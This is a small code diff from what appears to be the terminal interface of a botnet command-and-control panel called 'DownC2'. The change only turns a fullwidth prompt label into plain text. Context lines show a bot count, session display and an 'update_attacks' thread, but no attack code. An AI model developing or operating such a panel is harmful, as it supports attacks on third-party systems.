@@ -258,7 +258,7 @@ def main():
     threading.Thread(target=update_attacks, daemon=True).start()
     while True:
         sys.stdout.write(f"\x1b]2;0 boats | Succubus Custom Build | Serving {logged_in_user} | Active Sessions 2 | 9999.99 Millenium(s)\x07")
-        sin = input(f"\033[48;5;15m\033[1;31m{logged_in_user}\033[0m ★ \033[48;5;15m\033[1;31mＤｏｗｎＣ２\x1b[1;40m\033[0m ➤ \x1b[1;37m\033[0m")
+        sin = input(f"\033[48;5;15m\033[1;31m{logged_in_user}\033[0m ★ \033[48;5;15m\033[1;31mDownC2\x1b[1;40m\033[0m ➤ \x1b[1;37m\033[0m")
         sinput = sin.split(" ")[0]
         if sinput == "cls" or sinput == "c":
             os.system('clear')
